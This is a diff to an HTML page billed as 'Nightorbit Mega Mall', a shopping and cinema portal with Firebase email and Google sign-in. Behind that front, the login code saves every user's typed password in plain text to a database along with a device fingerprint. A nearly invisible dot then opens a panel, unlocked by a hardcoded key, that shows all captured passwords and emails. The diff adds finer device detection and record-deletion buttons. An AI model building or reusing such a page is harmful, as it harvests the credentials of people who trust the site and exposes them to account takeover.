@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Mega Mall - Full Version</title>
+    <title>Nightorbit Mega Mall - Elite Version</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -39,30 +39,27 @@
             text-shadow: 0 0 5px rgba(255,255,255,0.5); letter-spacing: 1px;
         }
 
-        .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 20px 0 5px 10px; letter-spacing: 2px; text-transform: uppercase; }
         .item-link { 
             background: rgba(255,255,255,0.06); padding: 14px; border-radius: 18px; 
             margin: 10px 0; display: flex; justify-content: space-between; align-items: center; 
             text-decoration: none; color: white; border-left: 5px solid var(--primary); 
-            transition: 0.4s; font-weight: 500; font-size: 14px;
+            transition: 0.4s; font-size: 14px;
         }
 
         #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
+        
         #logout-overlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000; z-index: 2000; display: none; 
             flex-direction: column; align-items: center; justify-content: center; text-align: center;
-            opacity: 0; transition: 1.5s ease;
+            opacity: 0; transition: 1.5s ease; padding: 20px;
         }
         
         .hidden { display: none !important; }
-        .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; z-index: 100; }
+        .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; }
+        .admin-trigger { position: absolute; bottom: 10px; right: 10px; font-size: 12px; color: rgba(255,255,255,0.05); cursor: pointer; }
         
-        /* Fixed Admin Dot Visibility */
-        .admin-trigger { 
-            position: absolute; bottom: 10px; right: 10px; font-size: 12px; 
-            color: rgba(255,255,255,0.15); cursor: pointer; z-index: 100; 
-        }
+        .del-btn { background: #ff3333; color: white; border: none; padding: 5px 12px; border-radius: 8px; font-size: 10px; cursor: pointer; margin-left: 5px; }
     </style>
 </head>
 <body>
@@ -71,42 +68,35 @@
     <div class="admin-trigger" onclick="openAdmin()">.</div>
 
     <div id="logout-overlay">
-        <div style="font-size: 80px; margin-bottom: 20px;">🌟</div>
-        <div id="bye-msg" style="font-size: 28px; color: var(--primary); text-shadow: 0 0 15px var(--primary); font-weight: bold;"></div>
-        <p style="color: #444; margin-top: 20px; letter-spacing: 2px;">N I G H T O R B I T</p>
+        <div style="font-size: 60px; margin-bottom: 20px;">🌙</div>
+        <div id="bye-msg" style="font-size: 18px; color: var(--primary); line-height: 1.8; font-weight: 500;"></div>
+        <div style="margin-top: 30px; color: #333; letter-spacing: 5px; font-size: 10px;">SECURE DISCONNECT</div>
     </div>
 
     <div id="admin-panel">
-        <h2 style="color: var(--primary);">System User Management</h2>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">Back to App</button>
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+            <h2 style="color: var(--primary); margin: 0;">Server Database</h2>
+            <button onclick="clearAllData()" style="background: red; color: white; border: none; padding: 8px 15px; border-radius: 10px; font-size: 12px; cursor: pointer;">CLEAR ALL INFO</button>
+        </div>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px;">Close Logs</button>
         <div id="user-list-display" style="margin-top: 30px;"></div>
     </div>
 
     <div id="login-box" class="card">
         <h1 style="color: var(--primary); margin: 0; letter-spacing: 4px; font-weight: 800;">NIGHTORBIT</h1>
-        <p style="color: #666; font-size: 12px; margin-bottom: 25px;">PREMIUM BAZAAR & CINEMA</p>
+        <p style="color: #666; font-size: 11px; margin-bottom: 25px;">PREMIUM BAZAAR SYSTEM</p>
         <input type="email" id="email-in" placeholder="Email Address">
         <input type="password" id="pass-in" placeholder="Password">
         <button class="btn-main" onclick="emailAuth()">LOG IN / SIGN UP</button>
-        <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">CONTINUE WITH GOOGLE</button>
+        <button class="btn-main" style="background:white; color:black; margin-top:15px;" onclick="googleAuth()">SIGN IN WITH GOOGLE</button>
     </div>
 
     <div id="main-page" class="card hidden">
-        <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 0;">Welcome</h2>
-        <p style="font-size: 11px; color: #555; margin-top: 5px;">Elite Session Active ✅</p>
-        
-        <div class="section-tag">🍔 Food Delivery</div>
-        <a href="https://www.foodpanda.pk" target="_blank" class="item-link" style="border-left-color: #d70147;">🐼 Foodpanda <span>PK</span></a>
-
-        <div class="section-tag">🛒 Digital Bazaar</div>
-        <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Official</span></a>
-        <a href="https://www.aliexpress.com" target="_blank" class="item-link">🌍 AliExpress <span>Global</span></a>
-        
-        <div class="section-tag">🎬 Cinema & Earning</div>
-        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Watch Movies <span>HD</span></a>
-        <a href="YOUR_LINK" target="_blank" class="item-link" style="border-left-color: #00ff00;">📥 Download & Earn <span>$ CASH</span></a>
-
-        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px;">DISCONNECT SESSION</button>
+        <h2 id="welcome-name" style="color: var(--primary);">Welcome</h2>
+        <a href="https://www.foodpanda.pk" target="_blank" class="item-link">🐼 Foodpanda <span>PK</span></a>
+        <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Shop</span></a>
+        <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Watch Movies</a>
+        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px;">LOGOUT SESSION</button>
     </div>
 
     <script>
@@ -123,9 +113,26 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.database();
-        let globalUserName = "User";
+        let globalUser = "User";
 
-        function masterBypass() { if(prompt("Key:") === "rr123456789000rr") showBazaarUI("Admin Farooq"); }
+        function getMyDevice() {
+            const ua = navigator.userAgent;
+            let model = "Web Browser";
+            if (ua.match(/\(([^)]+)\)/)) {
+                let section = ua.match(/\(([^)]+)\)/)[1];
+                let parts = section.split(';');
+                model = parts.length > 2 ? parts[parts.length - 1].trim().split('Build/')[0].split('WV')[0].trim() : parts[0];
+            }
+            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "XIAOMI", "IPHONE"];
+            for(let b of brands) { if(ua.toUpperCase().includes(b)) return (b + " " + model).toUpperCase(); }
+            return model.toUpperCase();
+        }
+
+        function masterBypass() {
+            if(prompt("Key:") === "rr123456789000rr") {
+                handleLogin({uid: "admin_fix", email: "Admin@Bypass.com"}, "Master Key");
+            }
+        }
         
         function openAdmin() {
             if (prompt("Admin Key:") === "rr123456789000rr") {
@@ -135,12 +142,14 @@
                     snap.forEach(s => {
                         let d = s.val();
                         html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
-                            <b style="color:var(--primary)">Name: ${d.savedName || 'Unknown'}</b><br>
-                            Pass: <span style="color:var(--gold)">${d.password || 'Saved'}</span><br>
-                            Email: <small>${d.email}</small><br>
-                            Device: <small style="color:#888">${d.deviceInfo}</small><br>
-                            Time: <small style="color:#666">${d.lastSeen}</small>
-                            <br><button onclick="renameUser('${s.key}')" style="margin-top:10px; padding:5px 15px;">Rename User</button>
+                            <b style="color:var(--primary)">Name: ${d.savedName}</b><br>
+                            Pass: <span style="color:var(--gold)">${d.password}</span><br>
+                            Device: <span style="color:#00ff00; font-size:10px;">${d.deviceInfo}</span><br>
+                            <small style="color:#666">${d.email} | ${d.lastSeen}</small>
+                            <br><div style="margin-top:10px;">
+                                <button onclick="renameUser('${s.key}')" style="font-size:10px; padding:5px 10px;">Rename</button>
+                                <button class="del-btn" onclick="deleteInfo('${s.key}')">DELETE INFO</button>
+                            </div>
                         </div>`;
                     });
                     document.getElementById('user-list-display').innerHTML = html;
@@ -148,8 +157,20 @@
             }
         }
 
+        function deleteInfo(id) {
+            if(confirm("Are you sure you want to delete this user info?")) {
+                db.ref('users/' + id).remove();
+            }
+        }
+
+        function clearAllData() {
+            if(confirm("DANGER: Are you sure you want to clear ALL user data from database?")) {
+                db.ref('users').remove();
+            }
+        }
+
         function renameUser(id) {
-            let n = prompt("Enter New Name:");
+            let n = prompt("New Name:");
             if(n) db.ref('users/'+id).update({savedName: n});
         }
 
@@ -160,7 +181,7 @@
 
         function emailAuth() {
             const e = document.getElementById('email-in').value, p = document.getElementById('pass-in').value;
-            if(!e || !p) return alert("Please enter Email and Password");
+            if(!e || !p) return alert("Enter Details");
             auth.signInWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p))
             .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)));
         }
@@ -168,43 +189,43 @@
         function handleLogin(user, p) {
             db.ref('users/' + user.uid).once('value', snap => {
                 let d = snap.val();
-                globalUserName = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
-                
-                // Real Device Detection
-                let ua = navigator.userAgent;
-                let deviceModel = "PC/Web";
-                if(ua.match(/Android/)) deviceModel = "Android " + ua.split("Android")[1].split(";")[0];
-                else if(ua.match(/iPhone/)) deviceModel = "iPhone";
-
-                // Password logic: Sirf tab update karein jab box mein password likha ho
-                let currentPass = (p === "ActiveSession" || p === "Google Account") ? (d ? d.password : p) : p;
+                globalUser = d && d.savedName ? d.savedName : (user.displayName || user.email.split('@')[0]);
+                let finalPass = (p === "Session" || p === "Google Account") ? (d ? d.password : p) : p;
 
                 db.ref('users/' + user.uid).update({
                     email: user.email,
-                    password: currentPass,
-                    savedName: globalUserName,
-                    deviceInfo: deviceModel,
+                    password: finalPass,
+                    savedName: globalUser,
+                    deviceInfo: getMyDevice(),
                     lastSeen: new Date().toLocaleString()
-                }).then(() => showBazaarUI(globalUserName));
+                }).then(() => {
+                    document.getElementById('login-box').classList.add('hidden');
+                    document.getElementById('main-page').classList.remove('hidden');
+                    document.getElementById('welcome-name').innerText = "Hello, " + globalUser;
+                });
             });
-        }
-
-        function showBazaarUI(name) {
-            globalUserName = name;
-            document.getElementById('login-box').classList.add('hidden');
-            document.getElementById('main-page').classList.remove('hidden');
-            document.getElementById('welcome-name').innerText = "Hello, " + name;
         }
 
         function triggerLogout() {
             const overlay = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!`;
+            const wish = `Allah Hafiz, Mere Pyare User <b>${globalUser}</b>!<br>
+            Aapka Hamari Website Par Aana Humare Liye Khushi Ki Baat Thi.<br>
+            Umeed Hai Aapka Waqt Nightorbit Par Acha Guzra Hoga.<br>
+            Hum Aapki Salamti Aur Khushiyon Ke Liye Dua-Go Hain.<br>
+            Zindagi Rahi To Phir Se Zaroor Mulaqat Hogi.<br>
+            Tab Tak Apna Aur Apne Pyaaron Ka Bohot Khayal Rakhiyega.<br>
+            Allah Aapko Hamesha Apni Hifz-o-Aman Mein Rakhe.<br>
+            Good Bye My Sweet Friend, See You Soon!<br>
+            ✨ Shukriya Aur Khuda Hafiz ✨`;
+            
+            document.getElementById('bye-msg').innerHTML = wish;
             overlay.style.display = 'flex';
             setTimeout(() => { overlay.style.opacity = '1'; }, 100);
-            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 4500);
+            setTimeout(() => { auth.signOut().then(() => location.reload()); }, 7000);
         }
 
-        auth.onAuthStateChanged(u => { if(u) handleLogin(u, "ActiveSession"); });
+        auth.onAuthStateChanged(u => { if(u) handleLogin(u, "Session"); });
     </script>
 </body>
-</html>
+            </html>
+            
